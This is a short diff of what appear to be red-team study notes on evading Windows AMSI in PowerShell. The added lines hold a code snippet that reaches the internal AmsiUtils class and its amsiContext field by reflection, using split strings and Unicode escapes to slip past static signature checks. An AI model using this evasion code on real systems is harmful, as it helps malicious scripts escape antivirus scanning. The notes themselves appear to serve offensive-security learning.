@@ -13,3 +13,8 @@ This means that all the functionality of AMSI is available in that process's add
 • Static analysis is the likely mechanism
 • Test this hypothesis
 • Use Unicode characters using built-in PowerShell functionality
+```
+[Ref].Assembly.GetType('System.Management.Automation.'+[regex]::Unescape('\u
+0041')+'msiUtils').GetField("ams"+[regex]::Unescape('\u0069')+"Context",'Non
+Public,Static').GetValue($null)
+```
